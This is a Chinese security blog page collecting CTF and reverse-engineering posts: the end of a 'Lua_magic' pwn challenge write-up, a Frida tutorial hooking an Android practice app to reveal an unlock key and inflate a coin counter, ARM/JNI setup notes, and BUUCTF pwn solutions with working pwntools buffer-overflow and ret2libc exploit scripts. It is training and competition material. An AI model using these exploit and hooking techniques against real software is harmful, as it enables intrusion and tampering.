+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function BitXOR(a,b)</span><br><span class="line">    local p,c=1,0</span><br><span class="line">    while a&gt;0 and b&gt;0 do</span><br><span class="line">        local ra,rb=a%2,b%2</span><br><span class="line">        if ra~=rb then c=c+p end</span><br><span class="line">        a,b,p=(a-ra)/2,(b-rb)/2,p*2</span><br><span class="line">    end</span><br><span class="line">    if a&lt;b then a=b end</span><br><span class="line">    while a&gt;0 do</span><br><span class="line">        local ra=a%2</span><br><span class="line">        if ra&gt;0 then c=c+p end</span><br><span class="line">        a,p=(a-ra)/2,p*2</span><br><span class="line">    end</span><br><span class="line">    return c</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">function hndl(i,j)</span><br><span class="line">	j = BitXOR(5977654,j)</span><br><span class="line">	return BitXOR(i,j)</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+
+<p>由于lua5.1不支持位运算，有必要写个异或运算函数到lua文件里边。我没改BitXOR名字，直接用了师傅的轮子。同时作为白嫖党吃人嘴短，做异或处理的时候用的5977654和stackoverflow的轮子<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/5977654/how-do-i-use-the-bitwise-operator-xor-in-lua">qustionid</a>对应</p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>选手拿题后应该是一个Lua_magic和经过处理enc过的main.lua，lua文件长这样</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165319-badfa85c-fb1e-1.png"></p>
+<p>用ida简单看下Lua_magic</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165333-c39101e4-fb1e-1.png"></p>
+<p>其实还好，用到的都分析出来了，之后就是动态调试程序，把内存中解密完的lua程序dump出来（enc执行完后下断）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165349-ccf343f0-fb1e-1.png"></p>
+<p>然后一起结合dump出来的lua程序和ida一起分析就好了。</p>
+<p>随机数的生成自己写个C脚本：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165403-d536d414-fb1e-1.png"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165413-db41e0b0-fb1e-1.png"></p>
+<p>算起来的话就反着来就行，和1异或完和5977654异或就好了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165428-e46d4396-fb1e-1.png"></p>
+<p>最后进入最后一步</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200920165443-ed31547c-fb1e-1.png"></p>
+<p>读入0x118字节，完全够了，全暴力填flag的bss地址就好，exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#ip=sys.argv[1]</span><br><span class="line">#port=sys.argv[2]</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">p=process(&#x27;./Lua_magic&#x27;)</span><br><span class="line">#p = remote(ip, port)</span><br><span class="line">p.recvuntil(&quot;Enter two numbers in your heart;)\n&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.sendline(&quot;1808823120&quot;)</span><br><span class="line">sleep(1)</span><br><span class="line">p.recvuntil(&quot;Enter two numbers in your heart;)\n&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.sendline(&quot;840963569&quot;)</span><br><span class="line">sleep(1)</span><br><span class="line">p.recvuntil(&quot;Enter two numbers in your heart;)\n&quot;)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.sendline(&quot;1684516446&quot;)</span><br><span class="line">sleep(1)</span><br><span class="line">p.send(p64(0x602140)*35)</span><br><span class="line">#p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="修复-总结"><a href="#修复-总结" class="headerlink" title="修复 &amp; 总结"></a>修复 &amp; 总结</h2><p>因为b就4个字节，patch成<code>read(0,b,4);</code>即可完成修复。</p>
+<p>这题流程比较长，在划分题目难度的时候觉得难点和亮点都在lua那块，就归到了中等难度。在好几个地方都能上一个难度系数，如加解密lua语句函数enc、lua脚本处理输入逻辑、read进去b后再搞个lua语句处理等，但想了想还是算了，觉得点到为止wei最佳，本身出这种题还是考验知识积累和快速学习，感觉再难点就偏了。</p>
+<p>刚出完我觉得还是很有趣的，自己做完感觉几个考察的点还是有点僵硬，出题真的是门艺术。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/09/24/2020-09-24-Lua_magic/" data-id="cuid3urvWlMSRwO7m2i-3Q5Ou" data-title="An interacting pwn" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2020-09-02-frida_hook" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/09/02/2020-09-02-frida_hook/" class="article-date">
+  <time class="dt-published" datetime="2020-09-01T16:00:00.000Z" itemprop="datePublished">2020-09-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/09/02/2020-09-02-frida_hook/">Introduction to Frida</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>首发于<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8211">先知</a></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>frida Xposed简单对比</p>
+</blockquote>
+<p>学安卓hook入门的时候纠结于选用哪个平台,Xposed和frida看了看,都在脑子里云了一下觉得都好好用,于是干脆和教程反着来,看着师傅<a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-850885-1-1.html">Xposed</a>的文章后用frida复现一遍(实战链接也在文章中,就不发出来了),而且之前<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4839">Peanuts</a>师傅也发过Xposed的了.</p>
+<p>其实两者差别还是比较大的,就拿工作方式来说,Xposed走的是开发那一套,,重新写组件后再打包用,可以说是一劳永逸,以后直接拿apk就能用;frida则不然,它的方式是把js代码注入到进程的方式,简单但是缺点也很明显就是不好用到实际app的使用中</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="本机实验环境"><a href="#本机实验环境" class="headerlink" title="本机实验环境"></a>本机实验环境</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3.7</span><br><span class="line">夜神模拟器Android5.1.1</span><br><span class="line">Windows10</span><br></pre></td></tr></table></figure>
+
+<h3 id="frida-安装"><a href="#frida-安装" class="headerlink" title="frida 安装"></a>frida 安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install frida</span><br><span class="line">pip install frida-tools</span><br></pre></td></tr></table></figure>
+
+<h3 id="frida-server-安装运行"><a href="#frida-server-安装运行" class="headerlink" title="frida-server 安装运行"></a>frida-server 安装运行</h3><p>先看看自己模拟器平台,一般模拟器架构都是x86的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ adb shell getprop ro.product.cpu.abi</span><br><span class="line">x86</span><br></pre></td></tr></table></figure>
+
+<p>我这边是x86的,到<a target="_blank" rel="noopener" href="https://github.com/frida/frida/releases">frida-releases</a>这找到对应版本进行下载,之后用adb把它push到手机中,转发到本机端口,起frida-server</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server /data/local/tmp</span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb shell /data/local/tmp/frida-server</span><br></pre></td></tr></table></figure>
+<p>已经起来了,可以用<code>frida-ps -U</code>看看模拟器进程</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822205451-ab0d3e44-e476-1.png"></p>
+<h2 id="hook实战测试"><a href="#hook实战测试" class="headerlink" title="hook实战测试"></a>hook实战测试</h2><blockquote>
+<p>实战链接在最上方</p>
+</blockquote>
+<p>就直接拿师傅的程序搞了,师傅用写xposed组件的方式写的,我就拿frida复现一遍,同时实现几个别的思路,开始吧</p>
+<h3 id="解锁码"><a href="#解锁码" class="headerlink" title="解锁码"></a>解锁码</h3><p>先装到手机上测试,发现进去后要一个key进行解锁.</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822205636-e9c1e644-e476-1.png"></p>
+<p>使用反编译工具(我用的jadx)打开apk,发现有两个小测验,第一处是要一个解锁码,解锁码与程序算出来的完全一致就跳到下一个挑战.</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822205855-3c7a6884-e477-1.png"></p>
+<p>进入加密函数一探究竟,可以看到进行了加密.</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822211451-76506a52-e479-1.png"></p>
+<p>之后程序使用equals函数判断和我们输入的是否相等(在此之前程序有一处输出解锁码的函数,即a.a,不过因为条件不满足未执行).</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822210006-66d01156-e477-1.png"></p>
+<p>了解流程后进行打hook绕过,思路有两种,一种是把真实的解锁码打印出来(这思路等下用两种方式实现,分别是hook掉打印函数a.a和系统函数equals的方式),还有偷鸡的方式就是直接修改加密函数return一个我们控制的值,之后在输入的时候直接输我们的值就好了.</p>
+<p>在注入js代码的时候有两种方式,分别是js直接加载和使用python的方式,python当作一个loader的角色把js代码注入进去,python代码在最下侧,本篇用的是python的方式.下面是js代码(这代码不用纠结,和pwntools一样用多了就熟练了):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;Script loaded successfully &quot;);</span><br><span class="line">Java.perform(function x() &#123;</span><br><span class="line">	var String = Java.use(&#x27;java.lang.String&#x27;)//定位到要hook的类名</span><br><span class="line">	String.equals.implementation = function (arg1) &#123;//equals就是我们要hook的函数</span><br><span class="line">	console.log(&quot;your input : &quot; + this.toString());</span><br><span class="line">	console.log(&quot;I&#x27;m the real key : &quot; + arg1);//打印出来真实的解锁码</span><br><span class="line">	var ret = this.equals(arg1);</span><br><span class="line">	return ret;//返回值</span><br><span class="line">	&#125;</span><br><span class="line">	var Show_key = Java.use(&quot;com.hfdcxy.android.by.a.a&quot;);</span><br><span class="line">	Show_key.a.overload(&quot;java.lang.String&quot;).implementation = function (args1) &#123;</span><br><span class="line">	console.log(&quot;Your_key_is&quot; + args1);//打印解锁码</span><br><span class="line">    &#125;</span><br><span class="line">	var my_class = Java.use(&quot;com.hfdcxy.android.by.test.a&quot;);</span><br><span class="line">    my_class.a.implementation = function () &#123;</span><br><span class="line">		return &quot;123456789&quot;;//使用&quot;123456789&quot;当返回值</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>三种方法都能完成步骤一的hook,使用python注入一下看看效果</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822210438-08b38142-e478-1.png"><br>看到了输入的123和真正的作比较<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822210459-15444680-e478-1.png"><br>成功了,进入下一个界面.本质上是两种方法,一种是hook自实现函数,一种就是hook系统函数</p>
+<h3 id="点金币-开宝箱"><a href="#点金币-开宝箱" class="headerlink" title="点金币,开宝箱"></a>点金币,开宝箱</h3><p>点金币的这个onclick执行的函数很简单,就是点击一次后coin加i(原本程序i等于1)</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822210749-7b096e96-e478-1.png"></p>
+<p>开宝箱按钮就是判断你的coin值大小,大于等于9999就完成挑战</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822210815-8a227328-e478-1.png"></p>
+<p>这里再介绍另一种姿势,就是修改函数的参数完成参数调用,frida实现起来也很简单,见js:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;Script loaded successfully &quot;);</span><br><span class="line">Java.perform(function x() &#123;</span><br><span class="line">	var coin = Java.use(&quot;com.hfdcxy.android.by.test.b&quot;);</span><br><span class="line">	coin.a.overload(&quot;android.content.SharedPreferences&quot;, &quot;android.widget.TextView&quot;, &quot;int&quot;).implementation = function (args1,args2,args3) &#123;//overload后接的参数都是这个a函数的参数</span><br><span class="line">		return this.a(args1,args2,9999)//把参数改成9999,这样一次就能加9999个了</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822211046-e4519eaa-e478-1.png"><br>点了几次coin就很大了,直接满足条件<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200822211143-061094b0-e479-1.png"></p>
+<h2 id="总结-python-loader"><a href="#总结-python-loader" class="headerlink" title="总结 &amp; python loader"></a>总结 &amp; python loader</h2><p>可以看到frida在hook时真的方便,代码也不难,本篇js太过简单,有好多很nb的模板都可以拿来练练并测试,<a target="_blank" rel="noopener" href="https://frida.re/docs/javascript-api/">官方文档</a>也是深入学习的好去处</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import frida</span><br><span class="line">device = frida.get_remote_device()</span><br><span class="line">pid = device.spawn([&quot;com.ss.android.ugc.aweme&quot;])#程序名</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(1) </span><br><span class="line">session = device.attach(pid)</span><br><span class="line">with open(&quot;s1.js&quot;) as f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line">input()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/09/02/2020-09-02-frida_hook/" data-id="cuidsQ6r3A8GMHwNybr8mn2TH" data-title="Introduction to Frida" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2020-08-10-android" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/08/10/2020-08-10-android/" class="article-date">
+  <time class="dt-published" datetime="2020-08-09T16:00:00.000Z" itemprop="datePublished">2020-08-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/08/10/2020-08-10-android/">Some Android Basics</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="Environment-construction"><a href="#Environment-construction" class="headerlink" title="Environment construction"></a>Environment construction</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#编译环境</span><br><span class="line">sudo apt install gcc-arm-linux-gnueabi</span><br><span class="line"></span><br><span class="line">#愉快编译</span><br><span class="line">arm-linux-gnueabi-gcc test.c -o test</span><br><span class="line"></span><br><span class="line">#运行环境</span><br><span class="line">sudo apt install qemu qemu-kvm qemu-system-arm</span><br><span class="line"></span><br><span class="line">#愉快使用qemu跑起来</span><br><span class="line">qemu-arm ./test</span><br><span class="line"></span><br><span class="line">#root@ubuntu:~/Desktop# qemu-arm test</span><br><span class="line">#/lib/ld-linux.so.3: No such file or directory</span><br><span class="line">#出现这种问题跑一下</span><br><span class="line">sudo cp  /usr/arm-linux-gnueabi/lib/ld-linux.so.3 /lib</span><br><span class="line">sudo cp /usr/arm-linux-gnueabi/lib/libgcc_s.so.1 /lib</span><br><span class="line">sudo cp /usr/arm-linux-gnueabi/lib/libc.so.6 /lib</span><br><span class="line"></span><br><span class="line">#调试环境</span><br><span class="line">sudo apt install gdb-arm-none-eabi </span><br><span class="line"></span><br><span class="line">#开启remote调试</span><br><span class="line">qemu-arm -g 1234 test</span><br><span class="line"></span><br><span class="line">(gdb) target remote localhost:1234</span><br><span class="line">Remote debugging using localhost:1234</span><br><span class="line">warning: A handler for the OS ABI &quot;GNU/Linux&quot; is not built into this configuration</span><br><span class="line">of GDB.  Attempting to continue with the default armv5t settings.</span><br><span class="line"></span><br><span class="line">0xf67ceb00 in ?? ()</span><br><span class="line">(gdb) b main</span><br><span class="line">Breakpoint 1 at 0x844c</span><br><span class="line">(gdb) r</span><br><span class="line">The &quot;remote&quot; target does not support &quot;run&quot;.  Try &quot;help target&quot; or &quot;continue&quot;.</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000844c in main ()</span><br><span class="line">(gdb) dis</span><br><span class="line">disable      disassemble  disconnect   display      </span><br><span class="line">(gdb) disassemble </span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00008444 &lt;+0&gt;:	push	&#123;r11, lr&#125;</span><br><span class="line">   0x00008448 &lt;+4&gt;:	add	r11, sp, #4</span><br><span class="line">=&gt; 0x0000844c &lt;+8&gt;:	ldr	r0, [pc, #12]	; 0x8460 &lt;main+28&gt;</span><br><span class="line">   0x00008450 &lt;+12&gt;:	bl	0x82e0 &lt;printf@plt&gt;</span><br><span class="line">   0x00008454 &lt;+16&gt;:	mov	r3, #0</span><br><span class="line">   0x00008458 &lt;+20&gt;:	mov	r0, r3</span><br><span class="line">   0x0000845c &lt;+24&gt;:	pop	&#123;r11, pc&#125;</span><br><span class="line">   0x00008460 &lt;+28&gt;:	ldrdeq	r8, [r0], -r8	; &lt;UNPREDICTABLE&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<h2 id="A-small-example-of-jni"><a href="#A-small-example-of-jni" class="headerlink" title="A small example of jni"></a>A small example of jni</h2><p>首先就是java文件(用于调用)和c文件(用于被调用)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public  class NativeDemo &#123;</span><br><span class="line">	&#123;</span><br><span class="line">		System.load(&quot;C:\\Users\\14555\\Desktop\\test\\sayHello.dll&quot;);//dll文件绝对路径</span><br><span class="line">	&#125;</span><br><span class="line">	public native void sayHello();</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		new NativeDemo().sayHello();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#include &quot;NativeDemo.h&quot;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">JNIEXPORT void JNICALL Java_NativeDemo_sayHello(JNIEnv *, jobject)&#123;</span><br><span class="line">	using namespace std;</span><br><span class="line">	printf(&quot;hello!jniworld&quot;);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>其中NativeDemo.h是根据<code>javac -h -jni NativeDemo.java</code>自动生成，但这得注意把生成的<code>#include &lt;jni.h&gt;</code>改成<code>#include &quot;jni.h&quot;</code>然后把需要的文件拷到当前目录（最简单的方式）</p>
+<p>dll文件生成就是这样，比较简单<br><code>g++ -m64 -shared hello.cpp -o sayHello.dll</code></p>
+<p>之后就是java文件编译运行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\14555\Desktop\test</span><br><span class="line">λ javac NativeDemo.java</span><br><span class="line"></span><br><span class="line">C:\Users\14555\Desktop\test</span><br><span class="line">λ java NativeDemo</span><br><span class="line">hello!jniworld</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/08/10/2020-08-10-android/" data-id="cuid2SGDTiDwabN1afeXafhaG" data-title="Some Android Basics" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2020-07-31-buuctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/07/31/2020-07-31-buuctf/" class="article-date">
+  <time class="dt-published" datetime="2020-07-30T16:00:00.000Z" itemprop="datePublished">2020-07-31</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/07/31/2020-07-31-buuctf/">pwn</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>寒假刷的buuctf上的pwn题，再过几遍基础，以后想玩了还会刷，持续更新。因为题太多自己又不是赛棍只能捡着刷，师傅们有想讨论的或求更新的可以发邮件，我尽力而为~~~</p>
+<h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>nc 连上 <code>cat flag</code> 即可</p>
+<h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p = process(&#39;./warmup_csaw_2016&#39;)
+context.log_level = &#39;debug&#39;
+#p=remote(&#39;node3.buuoj.cn&#39;,29987)
+payload = &#39;a&#39;*72+p64(0x40060D)
+sleep(0.1)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p = process(&#39;./pwn1_sctf_2016&#39;)
+context.log_level = &#39;debug&#39;
+#p=remote(&#39;node3.buuoj.cn&#39;,29987)
+payload = &#39;IIIIIIIIIIIIIIIIIIII1234&#39;+p64(0x8048F13)
+sleep(0.1)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>自己逆向太菜了,试出来的~~~</p>
+<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p = process(&#39;./ciscn_2019_n_1&#39;)
+context.log_level = &#39;debug&#39;
+payload = &#39;a&#39;*56+p64(0x4006BE)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>也可以覆盖 v2 值</p>
+<pre><code>from pwn import *
+p = process(&#39;./ciscn_2019_n_1&#39;)
+payload=&#39;a&#39;*0x2c+p64(0x41348000)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#p = process(&#39;./pwn_patched&#39;)
+libc=ELF(&#39;./libc-2.23.so&#39;)
+elf = ELF(&#39;./pwn_patched&#39;)
+context.log_level = &#39;debug&#39;
+p=remote(&#39;node3.buuoj.cn&#39;,26443)
+payload = &#39;\x00&#39;+&#39;\xff&#39;*(0x20-2)
+p.sendline(payload)
+p.recvuntil(&#39;Correct\n&#39;)
+got = elf.got[&quot;puts&quot;]
+plt = elf.plt[&#39;puts&#39;]
+payload = p32(plt)+p32(0x8048916)+p32(got)+p32(0x080487F6)+p32(235+12)
+p.sendline(&#39;a&#39;*(235-4)+p32(0x804a050+0xe7)+payload)
+real = u32(p.recvuntil(&#39;\x0a&#39;)[:-1])
+libc_base = real - libc.symbols[&quot;puts&quot;]
+one = 0x3a819 + libc_base
+print hex(one)
+p.send(&#39;a&#39;*235+p32(one)+p32(0))
+p.interactive()
+</code></pre>
+<p>就是一个常规的栈迁移.想法有点麻烦,中间穿插用了几个很菜的技巧,但 exp 还可以</p>
+<p>这里记录一下,首先 <code>\x123</code> 例如这种,系统只会保留后两个达到一个字节</p>
+<h2 id="ciscn-2019-c-1-ciscn-2019-en-2"><a href="#ciscn-2019-c-1-ciscn-2019-en-2" class="headerlink" title="ciscn_2019_c_1 &amp; ciscn_2019_en_2"></a>ciscn_2019_c_1 &amp; ciscn_2019_en_2</h2><pre><code>from pwn import *
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+p = process(&#39;./real&#39;)
+elf = ELF(&#39;./real&#39;)
+libc=elf.libc
+context.log_level = &#39;debug&#39;
+#p=remote(&#39;node3.buuoj.cn&#39;,26681)
+def cropy(payload):
+	te=&#39;&#39;
+	for a in (payload):
+		i=ord(a)
+		if  i &lt;= 0x60 or i &gt; 0x7A :
+			if  i &lt;= 0x40 or i &gt; 0x5A :
+				if  i &gt; 0x2F and i &lt;= 0x39 :
+					i =i^ 0xF
+			else:
+				i = i^0xE
+		else:
+			i = i^0xD
+		print i
+		te=te+chr(i)
+	print te
+	return te
+
+p.recvuntil(&#39;choice&#39;)
+p.sendline(&#39;1&#39;)
+p.recvuntil(&#39;encrypted&#39;)
+got = elf.got[&quot;puts&quot;]
+plt = elf.plt[&#39;puts&#39;]
+payload = &#39;a&#39;*88+p64(0x400C83)+p64(got)+p64(plt)+p64(0x400B28)
+co = cropy(payload)
+p.sendline(co)
